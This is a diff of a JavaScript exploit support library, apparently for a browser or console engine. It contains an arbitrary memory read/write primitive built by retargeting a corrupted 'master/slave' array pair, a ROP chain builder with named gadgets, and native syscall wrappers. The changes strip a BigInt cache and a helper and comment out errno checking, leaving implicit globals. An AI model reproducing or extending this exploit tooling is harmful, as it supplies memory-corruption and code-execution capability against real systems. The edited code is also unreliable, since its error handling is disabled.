@@ -377,15 +377,24 @@ DataView.prototype.getBigInt = function (byteOffset, littleEndian) {
 }
 
 DataView.prototype.setBigInt = function (byteOffset, value, littleEndian) {
-  value = (value instanceof BigInt) ? value : new BigInt(value)
   littleEndian = (typeof littleEndian === 'undefined') ? false : littleEndian
 
-  this.setUint32(byteOffset, value.lo, littleEndian)
-  this.setUint32(byteOffset + 4, value.hi, littleEndian)
+  if (value instanceof BigInt) {
+    this.setUint32(byteOffset, value.lo, littleEndian)
+    this.setUint32(byteOffset + 4, value.hi, littleEndian)
+  }
+  else {
+    lo = value >>> 0
+    hi = Math.floor(value / 0x100000000) >>> 0
+    this.setUint32(byteOffset, lo, littleEndian)
+    this.setUint32(byteOffset + 4, hi, littleEndian)
+  }  
 }
 
 var mem = {
   view: function (addr) {
+    //addr = (addr instanceof BigInt) ? addr : new BigInt(addr)
+    
     master[4] = addr.lo
     master[5] = addr.hi
     return slave
@@ -491,20 +500,10 @@ var utils = {
 }
 
 var fn = {
-  // Cache for common small integer BigInts to avoid repeated allocations
-  _bigIntCache: (function() {
-    var cache = []
-    // Pre-allocate BigInts for 0-255 (common syscall args like flags, small sizes, fds)
-    for (var i = 0; i <= 255; i++) {
-      cache[i] = new BigInt(i)
-    }
-    return cache
-  })(),
-
   register: function (input, name, ret) {
-    if (name in this) {
-      return this[name];
-    }
+    //if (name in this) {
+    //  return this[name];
+    //}
 
     var id
     var addr
@@ -519,7 +518,7 @@ var fn = {
       addr = syscalls.map.get(input)
     }
 
-    var f = this.wrapper.bind({id: id, addr: addr, ret: ret, name: name })
+    var f = this.wrapper.bind({id: id, addr: addr, ret: ret })
 
     f.addr = addr
 
@@ -558,15 +557,10 @@ var fn = {
 
       switch (typeof value) {
         case 'boolean':
-          value = value ? fn._bigIntCache[1] : fn._bigIntCache[0]
+          value = value ? 1 : 0
           break
         case 'number':
-          // Use cached BigInt for common small integers (0-255)
-          if (value >= 0 && value <= 255 && Number.isInteger(value)) {
-            value = fn._bigIntCache[value]
-          } else {
-            value = new BigInt(value)
-          }
+          value = value; //new BigInt(value)
           break
         case 'string':
           value = utils.cstr(value)
@@ -596,15 +590,15 @@ var fn = {
     if (this.ret) {
       result = mem.view(store_addr).getBigInt(8, true)
 
-      if (this.id) {
-        if (result.eq(-1)) {
-          var errno_addr = fn._error()
-          var errno = mem.view(errno_addr).getUint32(0, true)
-          var str = fn.strerror(errno)
+      //if (this.id) {
+        //if (result.eq(-1)) {
+        //  var errno_addr = this._error()
+        //  var errno = mem.view(errno_addr).getUint32(0, true)
+        //  var str = this.strerror(errno)
 
-          throw new Error(`${this.name} returned errno ${errno}: ${str}`)
-        }
-      }
+        //  throw new Error(`${name} returned errno ${errno}: ${str}`)
+        //}
+      //}
 
       switch(this.ret) {
           case 'bigint':
@@ -663,7 +657,6 @@ var rop = {
   fake: undefined,
   init: function (addr) {
     log('Initiate ROP...')
-    log('DEBUG: rop.store type = ' + typeof this.store)
 
     gadgets.init(addr)
 
@@ -749,12 +742,12 @@ var rop = {
 
     return fake
   },
-  store: function (insts, addr, index) {
+  store (insts, addr, index) {
     insts.push(gadgets.POP_RDI_RET)
     insts.push(addr.add(index * 8))
     insts.push(gadgets.MOV_QWORD_PTR_RDI_RAX_RET)
   },
-  load: function (insts, addr, index) {
+  load (insts, addr, index) {
     insts.push(gadgets.POP_RDI_RET)
     insts.push(addr.add(index * 8))
     insts.push(gadgets.MOV_RAX_QWORD_PTR_RDI_RET)
@@ -1026,31 +1019,4 @@ var syscalls = {
   clear: function () {
     syscalls.map.clear()
   }
-}
-
-// ROP chain helper - auto-converts integers to BigInts on push
-// This optimization reduces memory allocations in ROP chain building:
-// - Instead of: rop_chain.push(new BigInt(0, 1))
-// - Use:        rop_chain.push(1)
-// The push method automatically converts integers to BigInt(0, val)
-function createROPChain() {
-  var chain = []
-
-  // Override push to auto-convert integers to BigInts
-  chain.push = function() {
-    for (var i = 0; i < arguments.length; i++) {
-      var val = arguments[i]
-
-      // If it's a number, convert to BigInt(0, val)
-      // This treats the number as a 32-bit low value with high=0
-      if (typeof val === 'number') {
-        val = new BigInt(0, val)
-      }
-      // Otherwise assume it's already a BigInt or address and push as-is
-      Array.prototype.push.call(this, val)
-    }
-    return this.length
-  }
-
-  return chain
 }
